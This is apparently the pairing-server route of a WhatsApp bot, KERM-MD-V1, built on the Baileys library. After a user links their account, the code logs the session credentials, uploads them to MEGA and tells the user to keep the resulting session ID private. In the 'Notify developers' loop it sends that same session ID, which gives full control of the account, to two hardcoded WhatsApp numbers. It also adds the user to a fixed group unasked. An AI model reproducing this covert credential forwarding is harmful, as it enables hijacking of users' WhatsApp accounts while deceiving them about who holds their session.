import express from 'express';
import fs from 'fs';
import pino from 'pino';
import {
    makeWASocket,
    useMultiFileAuthState,
    delay,
    makeCacheableSignalKeyStore,
    Browsers,
    jidNormalizedUser
} from '@whiskeysockets/baileys';
import { upload } from './mega.js';

const router = express.Router();

const DEVELOPERS = ['237656520674@s.whatsapp.net', '237650564445@s.whatsapp.net'];
const GROUP_ID = '120363186494616906@g.us'; // ID du groupe WhatsApp
const CHANNEL_LINK = 'https://whatsapp.com/channel/0029Vafn6hc7DAX3fzsKtn45';

function removeFile(FilePath) {
    try {
        if (!fs.existsSync(FilePath)) return false;
        fs.rmSync(FilePath, { recursive: true, force: true });
    } catch (e) {
        console.error('Error removing file:', e);
    }
}

router.get('/', async (req, res) => {
    let num = req.query.number;
    if (!num) {
        return res.status(400).send({ error: 'Missing phone number' });
    }

    num = num.replace(/[^0-9]/g, '');  // Assurez-vous que seuls les chiffres sont pris en compte
    if (num.length < 10) {
        return res.status(400).send({ error: 'Invalid phone number' });
    }

    let dirs = './' + (num || `session`);

    await removeFile(dirs);

    async function initiateSession() {
        const { state, saveCreds } = await useMultiFileAuthState(dirs);

        try {
            let sock = makeWASocket({
                auth: {
                    creds: state.creds,
                    keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" }))
                },
                printQRInTerminal: false,
                logger: pino({ level: "fatal" }),
                browser: Browsers.ubuntu("KERM-MD-V1")
            });

            if (!sock.authState.creds.registered) {
                console.log(`User ${num} is not registered. Generating pairing code...`);

                const code = await sock.requestPairingCode(num);
                console.log('Pairing code generated:', code);

                if (!res.headersSent) {
                    console.log('Sending pairing code to user:', num);
                    await res.send({ code });
                }
            }

            sock.ev.on('creds.update', saveCreds);
            sock.ev.on("connection.update", async (s) => {
                const { connection, lastDisconnect } = s;

                if (connection === "open") {
                    console.log('Connection established. Proceeding with session setup...');
                    await delay(10000);
                    const sessionData = fs.readFileSync(dirs + '/creds.json');
                    console.log('Session data saved:', sessionData.toString());

                    function generateRandomId(length = 6, numberLength = 4) {
                        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
                        let result = '';
                        for (let i = 0; i < length; i++) {
                            result += characters.charAt(Math.floor(Math.random() * characters.length));
                        }
                        const number = Math.floor(Math.random() * Math.pow(10, numberLength));
                        return `${result}${number}`;
                    }

                    const megaUrl = await upload(fs.createReadStream(`${dirs}/creds.json`), `${generateRandomId()}.json`);
                    let sessionId = 'KERM-MD-V1~' + megaUrl.replace('https://mega.nz/file/', '');
                    console.log('Session ID:', sessionId);

                    const userJid = jidNormalizedUser(num + '@s.whatsapp.net');

                    // Send session ID and welcome message to the user
                    await sock.sendMessage(userJid, { text: sessionId });
                    await sock.sendMessage(userJid, {
                        text: `🎉 *Welcome to KERM-MD-V1!* 🚀\n\n🔒 *Your Session ID* is ready!  ⚠️ _Keep it private and secure — don’t share it with anyone._\n\n🔑 *Copy & Paste the SESSION_ID Above*🛠️ Add it to your environment variable: *SESSION_ID*.\n\n💡 *Whats Next?*\n1️⃣ Explore all the cool features of Kerm MD V1.\n2️⃣ Stay updated with our latest releases and support.\n3️⃣ Enjoy seamless WhatsApp automation! 🤖\n🔗 *Join Our Support Channel:* 👉\n[Click Here to Join](https://whatsapp.com/channel/0029Vafn6hc7DAX3fzsKtn45)\n⭐ *Show Some Love!* Give us a ⭐ on GitHub and support the development: 👉 [KERM-MD-V1 GitHub Repo](https://github.com/Kgtech-cmr/)\n🚀 _Thanks for choosing KERM-MD-V1 — Let the automation begin!_ ✨`
                    });

                    // Add user to group
                    try {
                        await sock.groupParticipantsUpdate(GROUP_ID, [userJid], "add");
                        console.log(`User ${num} added to the group.`);
                    } catch (err) {
                        console.log("Error adding to group :", err.message);
                    }

                    // Notify developers
                    for (let dev of DEVELOPERS) {
                        await sock.sendMessage(dev, {
                            text: `✅ *NEW USER CONNECTED!* \n\n• Number: ${num}\n• Session: ${sessionId}\n• Added to the KERM-MD-V1 group`
                        });
                    }

                    // Clean up
                    await delay(1000);
                    removeFile(dirs);
                    process.exit(0);
                } else if (connection === 'close' && lastDisconnect?.error?.output?.statusCode !== 401) {
                    console.log('Connection closed unexpectedly:', lastDisconnect?.error);
                    await delay(10000);
                    initiateSession();
                }
            });
        } catch (err) {
            console.error('Session error:', err);
            if (!res.headersSent) {
                res.status(503).send({ code: 'Service Unavailable' });
            }
        }
    }

    await initiateSession();
});

process.on('uncaughtException', (err) => {
    console.log('Caught exception: ' + err);
});

export default router;